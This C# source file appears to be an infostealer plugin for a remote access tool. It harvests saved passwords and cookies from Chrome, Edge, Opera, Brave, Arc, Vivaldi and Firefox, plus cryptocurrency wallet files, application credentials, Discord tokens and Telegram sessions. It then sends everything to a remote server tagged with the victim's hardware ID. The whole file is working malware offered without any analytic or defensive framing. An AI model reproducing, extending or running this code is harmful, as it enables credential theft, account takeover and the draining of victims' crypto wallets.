using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;
using Plugin.Browsers;
using Plugin.Crypto;
using Plugin.Apps;
using Plugin.Messaging;
using MessagePackLib.MessagePack;

namespace Plugin
{
    using CS_SQLite3;
    class Recorvery
    {
        public static string his = "";
        public static string login0 = "";
        public static string totalResults = "";
        public static string totallogins = "";
        public static string totalhistories = "";
        public static string totalCrypto = "";
        public static string totalApps = "";
        public static string totalMessaging = "";
        
        public static void Recorver()
        {
            // Path builder for Chrome install location
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            // Updated browser paths for 2025 - added Arc and Vivaldi
            string[] paths = new string[7];
            paths[0] = localAppData + "\\Google\\Chrome\\User Data\\";
            paths[1] = localAppData + "\\Microsoft\\Edge\\User Data\\";
            paths[2] = localAppData + "\\Microsoft\\Edge Beta\\User Data\\";
            paths[3] = System.Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\";
            paths[4] = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\";
            paths[5] = localAppData + "\\Arc\\User Data\\";       // Arc Browser (2023+)
            paths[6] = localAppData + "\\Vivaldi\\User Data\\";  // Vivaldi Browser


            foreach (string path in paths)
            {
                if (Directory.Exists(path))
                {
                    string browser = "";
                    string fmtString = "[*] {0} {1} extraction.\n";
                    if (path.ToLower().Contains("chrome"))
                    {
                        browser = "Google Chrome";
                    } else if (path.ToLower().Contains("edge beta"))
                    {
                        browser = "Edge Beta";
                    } else if (path.ToLower().Contains("opera"))
                    {
                        browser = "Opera";
                    } else if (path.ToLower().Contains("brave"))
                    {
                        browser = "Brave";
                    } else if (path.ToLower().Contains("arc"))
                    {
                        browser = "Arc";
                    } else if (path.ToLower().Contains("vivaldi"))
                    {
                        browser = "Vivaldi";
                    } else
                    {
                        browser = "Edge";
                    }
                    Console.WriteLine(string.Format(fmtString, "Beginning", browser));
                    // do something
                    ExtractData(path, browser);
                    Console.WriteLine(string.Format(fmtString, "Finished", browser));
                }
            }
            
            // Extract Firefox data
            try
            {
                Console.WriteLine("[*] Beginning Firefox extraction.");
                FirefoxStealer firefoxStealer = new FirefoxStealer();
                var firefoxLogins = firefoxStealer.GetPasswords();
                var firefoxCookies = firefoxStealer.GetCookies();
                
                foreach (var login in firefoxLogins)
                {
                    login0 += string.Format("URL: {0}\nUsername: {1}\nPassword: {2}\n\n", 
                        login.Url, login.Username, login.Password);
                }
                
                Console.WriteLine("[*] Finished Firefox extraction.");
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Firefox Exception: " + ex.Message);
            }
            
            // Extract Cryptocurrency Wallets
            try
            {
                Console.WriteLine("[*] Beginning Crypto Wallet extraction.");
                CryptoWalletManager cryptoManager = new CryptoWalletManager();
                var walletData = cryptoManager.StealAllWallets();
                
                if (walletData.Count > 0)
                {
                    totalCrypto = "[*] Found " + walletData.Count + " wallet files:\n";
                    foreach (KeyValuePair<string, byte[]> kvp in walletData)
                    {
                        totalCrypto += string.Format("  - {0} ({1} bytes)\n", kvp.Key, kvp.Value.Length);
                    }
                }
                
                Console.WriteLine("[*] Finished Crypto Wallet extraction.");
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Crypto Exception: " + ex.Message);
            }
            
            // Extract Application Credentials
            try
            {
                Console.WriteLine("[*] Beginning App Credentials extraction.");
                totalApps = AppCredentialManager.FormatCredentialsReport();
                Console.WriteLine("[*] Finished App Credentials extraction.");
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Apps Exception: " + ex.Message);
            }
            
            // Extract Messaging App Data
            try
            {
                Console.WriteLine("[*] Beginning Messaging Apps extraction.");
                var messagingData = MessagingManager.StealAllMessagingData();
                
                if (messagingData.ContainsKey("Discord_Tokens"))
                {
                    var tokens = (List<string>)messagingData["Discord_Tokens"];
                    totalMessaging += "[*] Discord Tokens Found: " + tokens.Count + "\n";
                    foreach (string token in tokens)
                    {
                        totalMessaging += "  - " + token + "\n";
                    }
                }
                
                if (messagingData.ContainsKey("Telegram_Session"))
                {
                    var sessions = (Dictionary<string, byte[]>)messagingData["Telegram_Session"];
                    totalMessaging += "\n[*] Telegram Session Files: " + sessions.Count + "\n";
                    foreach (string filename in sessions.Keys)
                    {
                        totalMessaging += "  - " + filename + "\n";
                    }
                }
                
                Console.WriteLine("[*] Finished Messaging Apps extraction.");
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Messaging Exception: " + ex.Message);
            }

            Console.WriteLine("[*] Done.");
            
            // Send all collected data to server
            SendDataToServer();
        }
        
        private static void SendDataToServer()
        {
            try
            {
                Console.WriteLine("[*] Sending data to server...");
                
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                
                // Browser data (existing)
                msgpack.ForcePathObject("Logins").AsString = login0;
                msgpack.ForcePathObject("Cookies").AsString = totalResults;
                
                // Crypto wallets (new)
                if (!string.IsNullOrEmpty(totalCrypto))
                {
                    msgpack.ForcePathObject("CryptoInfo").AsString = totalCrypto;
                }
                else
                {
                    msgpack.ForcePathObject("CryptoInfo").AsString = "";
                }
                
                // App credentials (new)
                if (!string.IsNullOrEmpty(totalApps))
                {
                    msgpack.ForcePathObject("AppCredentials").AsString = totalApps;
                }
                else
                {
                    msgpack.ForcePathObject("AppCredentials").AsString = "";
                }
                
                // Messaging data (new)
                if (!string.IsNullOrEmpty(totalMessaging))
                {
                    msgpack.ForcePathObject("MessagingData").AsString = totalMessaging;
                }
                else
                {
                    msgpack.ForcePathObject("MessagingData").AsString = "";
                }
                
                Connection.Send(msgpack.Encode2Bytes());
                Console.WriteLine("[*] Data sent successfully!");
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Send Exception: " + ex.Message);
            }
        }

        static void ExtractData(string path, string browser)
        {
            ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
            try
            {
                //getCookies
                var cookies = chromeManager.GetCookies();
                foreach (var cookie in cookies)
                {
                    string jsonArray = cookie.ToJSON();
                    string jsonItems = jsonArray.Trim(new char[] { '[', ']', '\n' });
                    totalResults += jsonItems + ",\n";
                }
                totalResults = totalResults.Trim(new char[] { ',', '\n' });
                totalResults = "[" + totalResults + "]";

                //getLogins
                var logins = chromeManager.GetSavedLogins();
                foreach (var login in logins)
                {
                    login.Print();
                }
                totallogins = login0;


            }
            catch (Exception ex)
            {
                Packet.Error("[X] Exception: " + ex.Message + ex.StackTrace);
            }
        }
    }
}
